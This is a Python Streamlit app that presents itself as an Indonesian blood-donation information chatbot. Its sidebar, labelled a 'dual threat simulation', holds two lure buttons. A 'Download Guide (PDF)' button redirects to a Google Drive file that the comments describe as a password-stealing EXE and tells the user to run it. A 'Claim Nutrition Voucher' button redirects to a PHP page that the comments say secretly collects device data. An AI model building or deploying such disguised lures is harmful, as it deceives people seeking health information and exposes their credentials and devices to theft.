import streamlit as st
import json
import numpy as np
import random
import nltk
from nltk.stem import LancasterStemmer
from sklearn.neural_network import MLPClassifier

# ===============================
# 1. KONFIGURASI HALAMAN
# ===============================
st.set_page_config(
    page_title="Sahabat Donor AI",
    page_icon="🩸",
    layout="centered"
)

# ===============================
# 2. LOAD & TRAIN MODEL
# ===============================
@st.cache_resource
def init_model():
    nltk.download('punkt')
    nltk.download('punkt_tab')
    
    stemmer = LancasterStemmer()

    # Membaca dataset intent
    with open("intents.json", encoding="utf-8") as f:
        data = json.load(f)

    words, labels, docs_x, docs_y = [], [], [], []

    for intent in data["intents"]:
        for pattern in intent["patterns"]:
            tokens = nltk.word_tokenize(pattern)
            words.extend(tokens)
            docs_x.append(tokens)
            docs_y.append(intent["tag"])
        if intent["tag"] not in labels:
            labels.append(intent["tag"])

    words = sorted(list(set(stemmer.stem(w.lower()) for w in words if w != "?")))
    labels = sorted(labels)

    training, output = [], []
    for i, doc in enumerate(docs_x):
        bag = []
        stemmed = [stemmer.stem(w.lower()) for w in doc]
        for w in words:
            bag.append(1 if w in stemmed else 0)
        training.append(bag)
        output.append(labels.index(docs_y[i]))

    # Model: MLP
    model = MLPClassifier(
        hidden_layer_sizes=(16, 16),
        max_iter=1000,
        random_state=42
    )
    model.fit(np.array(training), np.array(output))

    return words, labels, model, data, stemmer

words, labels, model, data, stemmer = init_model()

# ===============================
# 3. LOGIKA RESPONS CHATBOT
# ===============================
def get_response(text):
    text_lower = text.lower()
    if "jadwal" in text_lower or "hari ini" in text_lower:
        return (
            "Jadwal donor darah biasanya tersedia setiap hari kerja di kantor PMI. "
            "Untuk jadwal hari ini, silakan cek media sosial PMI setempat atau aplikasi Donorku."
        )

    bag = [0] * len(words)
    tokens = [stemmer.stem(w.lower()) for w in nltk.word_tokenize(text)]
    for token in tokens:
        for i, w in enumerate(words):
            if w == token:
                bag[i] = 1

    probs = model.predict_proba([bag])[0]
    idx = np.argmax(probs)

    if probs[idx] > 0.35:
        tag = labels[idx]
        for intent in data["intents"]:
            if intent["tag"] == tag:
                return random.choice(intent["responses"])

    return "Maaf, saya hanya bisa membantu seputar informasi donor darah 🩸"

# ===============================
# 4. SIDEBAR (SCENARIO: DUAL THREAT SIMULATION)
# ===============================
with st.sidebar:
    st.markdown("## 📚 Edukasi & Reward")
    st.info("Dapatkan panduan kesehatan dan voucher nutrisi eksklusif.")
    
    # Link 1: Payload EXE (Pencuri Password)
    link_exe = "https://drive.google.com/file/d/1q8b-mJ6Opj-N6YO2BeKTVAijZjQAx3x7/view?usp=sharing"
    
    # Link 2: Pelacak PHP (Pencuri Data Perangkat/Profiling)
    # GANTI URL INI dengan alamat file pelacak.php kamu di InfinityFree
    link_voucher = "http://hadiah-donor.page.gd/pelacak.php"
    
    st.write("---")
    st.write("**Materi & Hadiah:**")
    
    # TOMBOL 1: DOWNLOAD PANDUAN
    if st.button("📥 1. Download Panduan (PDF)"):
        st.warning("Mengunduh... Jalankan file untuk verifikasi.")
        st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{link_exe}\'">', unsafe_allow_html=True)

    st.write("") # Jarak

    # TOMBOL 2: KLAIM VOUCHER
    if st.button("🎁 2. Klaim Voucher Nutrisi"):
        st.success("Membuka halaman klaim...")
        # Ini akan membuka file PHP kamu yang mencuri data perangkat secara diam-diam
        st.markdown(f'<meta http-equiv="refresh" content="0;URL=\'{link_voucher}\'">', unsafe_allow_html=True)

    st.write("---")
    if st.button("🗑️ Reset Chat"):
        st.session_state.messages = []
        st.rerun()
        
# ===============================
# 5. HEADER & UI CHAT
# ===============================
st.markdown("<h1 style='text-align:center; color:#e63946;'>🩸 Sahabat Donor AI</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align:center;'>Asisten Informasi Donor Darah Indonesia</p>", unsafe_allow_html=True)
st.divider()

if "messages" not in st.session_state:
    st.session_state.messages = [
        {"role": "assistant", "content": "Halo! Saya Sahabat Donor. Ada yang bisa saya bantu terkait donor darah?"}
    ]

for msg in st.session_state.messages:
    align = "flex-end" if msg["role"] == "user" else "flex-start"
    bg = "#ffe3e3" if msg["role"] == "user" else "#f1f3f6"
    radius = "18px 18px 4px 18px" if msg["role"] == "user" else "18px 18px 18px 4px"
    
    st.markdown(f"""
    <div style="display:flex; justify-content:{align}; margin:10px 0;">
        <div style="background:{bg}; padding:10px 14px; border-radius:{radius}; max-width:75%; color:black;">
            {msg["content"]}
        </div>
    </div>
    """, unsafe_allow_html=True)

if prompt := st.chat_input("Tanya sesuatu..."):
    st.session_state.messages.append({"role": "user", "content": prompt})
    response = get_response(prompt)
    st.session_state.messages.append({"role": "assistant", "content": response})
    st.rerun()